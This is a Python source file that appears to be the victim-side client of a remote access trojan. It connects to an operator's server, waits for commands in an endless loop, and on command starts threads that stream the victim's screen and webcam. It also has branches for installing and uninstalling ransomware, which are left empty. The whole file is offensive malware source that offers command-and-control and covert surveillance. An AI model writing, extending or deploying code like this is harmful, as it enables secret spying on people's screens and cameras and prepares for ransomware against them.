from os.path import dirname, abspath
import sys

d = dirname(dirname(abspath(__file__)))
sys.path.append(d)

import threading
from constants import INSTALL_RANSOMWARE_COMMAND, UNINSTALL_RANSOMWARE_COMMAND, WATCH_SCREEN_COMMAND, WATCH_WEBCAM_COMMAND
from pyautogui import sleep
from victim.classes.host import Host
from victim.victim_constants import HOST_IP, HOST_PORT



host = None



def processCommand(command):
    """
    Processes and Executes the command

    param 1: the command
    param 1 type: str
    """

    if command == WATCH_SCREEN_COMMAND:
        # Waits for screen sharing to be avaliable
        while not host.isScreenSharingAvaliable():
            sleep(0.1)

        threading.Thread(target=host.shareScreen).start()

    elif command == WATCH_WEBCAM_COMMAND:
        # Waits for web cam sharing to be avaliable
        while not host.isWebCamSharingAvaliable():
            sleep(0.1)
        threading.Thread(target=host.shareWebCam).start()

    elif command == INSTALL_RANSOMWARE_COMMAND:
        pass

    elif command == UNINSTALL_RANSOMWARE_COMMAND:
        pass




def main():
    global host
    host = Host(HOST_IP, HOST_PORT)
    host.connectToServer() # Starts server


    while True:
        command = host.getCommand()
        processCommand(command)


if __name__ == "__main__":
    main()
